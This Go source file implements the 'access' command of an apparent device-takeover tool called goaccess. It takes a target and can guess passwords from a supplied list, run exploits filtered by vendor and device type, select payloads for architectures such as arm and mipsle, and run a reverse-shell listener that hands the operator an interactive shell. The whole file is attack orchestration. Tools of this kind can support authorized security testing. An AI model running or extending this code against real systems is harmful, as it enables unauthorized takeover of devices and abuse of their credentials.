package main

import (
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/cookiengineer/goaccess/payload"
	"github.com/cookiengineer/goaccess/report"
	"github.com/cookiengineer/goaccess/shell"
	"github.com/cookiengineer/goaccess/types"
)

func runAccess(arguments []string) {
	flags := flag.NewFlagSet("access", flag.ExitOnError)
	threads := flags.Int("threads", 8, "Number of parallel threads")
	timeoutSeconds := flags.Int("timeout", 8, "Timeout in seconds")
	payloadArch := flags.String("payload", "", "Preferred payload architecture (arm, mipsle, x86_64, etc.)")
	listenPort := flags.Int("listen", 0, "Listen port for reverse shells")
	noExploit := flags.Bool("no-exploit", false, "Skip exploitation, creds only")
	noCreds := flags.Bool("no-creds", false, "Skip credential checks, exploits only")
	shellFlag := flags.Bool("shell", false, "Drop to interactive shell after exploitation")
	usernameFlag := flags.String("username", "admin", "Username for authenticated takeover")
	passwordFlag := flags.String("password", "", "Password for authenticated takeover")
	passwordList := flags.String("password-list", "", "File with passwords to try with --username")
	vendorFilter := flags.String("vendor", "", "Filter exploits by vendor")
	typeFilter := flags.String("type", "", "Filter exploits by device type")
	jsonOutput := flags.Bool("json", false, "Output as JSON")
	outputFile := flags.String("output", "", "Write JSON output to file")
	verbose := flags.Bool("verbose", false, "Verbose output")

	flags.Parse(arguments)

	target := flags.Arg(0)
	if target == "" {
		fmt.Fprintln(os.Stderr, "Error: target is required")
		fmt.Fprintln(os.Stderr, "Usage: goaccess access <target> [flags]")
		os.Exit(1)
	}

	var suppliedPasswords []string
	if *passwordList != "" {
		loaded, err := loadPasswordList(*passwordList)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %s\n", err)
			os.Exit(1)
		}
		suppliedPasswords = loaded
	}

	outputWriter := os.Stdout
	var jsonOutputFile *os.File
	if *outputFile != "" {
		file, err := os.Create(*outputFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: cannot create output file: %s\n", err)
			os.Exit(1)
		}
		defer file.Close()
		jsonOutputFile = file
	}

	output := report.NewReport(*jsonOutput, *verbose, outputWriter)

	config := &types.ScanConfig{
		Target:          target,
		Threads:         *threads,
		Timeout:         time.Duration(*timeoutSeconds) * time.Second,
		Verbose:         *verbose,
		SkipCredentials: *noCreds,
		SkipExploits:    *noExploit,
		Username:        *usernameFlag,
		Password:        *passwordFlag,
		Passwords:       suppliedPasswords,
		VendorFilter:    *vendorFilter,
		TypeFilter:      types.DeviceType(*typeFilter),
	}

	if *payloadArch != "" {
		config.Payload = *payloadArch
	}
	if *listenPort != 0 {
		config.LPORT = *listenPort
	}

	scanEngine := defaultScanner(config)

	if *listenPort > 0 {
		listener, err := shell.StartReverseListener(*listenPort)
		if err != nil {
			output.Error("Cannot start listener: %s", err)
			os.Exit(1)
		}
		defer listener.Close()
		output.Status("Listening for reverse shells on 0.0.0.0:%d", *listenPort)

		// Run reverse listener in background
		go func() {
			shell.RunReverseListener(listener, 300*time.Second)
		}()
	}

	output.Status("Starting access attempt on %s...", target)
	if *passwordFlag != "" || len(suppliedPasswords) > 0 {
		count := 0
		if *passwordFlag != "" {
			count = 1
		}
		count += len(suppliedPasswords)
		output.Status("Supplied credentials: username=%q, %d password(s)", *usernameFlag, count)
	}

	result, err := scanEngine.Access(target, config)
	if err != nil {
		output.Error("Access failed: %s", err)
		os.Exit(1)
	}

	output.PrintAccessResult(result)

	if jsonOutputFile != nil {
		jsonRep := report.NewReport(true, false, jsonOutputFile)
		jsonRep.WriteJSON(result)
	}

	if *shellFlag && result.Shell != nil && result.Shell.Conn != nil {
		output.Success("Dropping to interactive shell...")
		handler := &shell.Handler{}
		handler.Interact(result.Shell.Conn)
	}

	if result.Success && *payloadArch != "" {
		output.Status("Payload architecture: %s", *payloadArch)
		if info := payload.List(); len(info) > 0 {
			for _, p := range info {
				if p.Arch == payload.Arch(*payloadArch) {
					output.Status("Payload available: %s/%s (%d bytes)", p.Arch, p.Handler, p.Size)
				}
			}
		}
	}
}
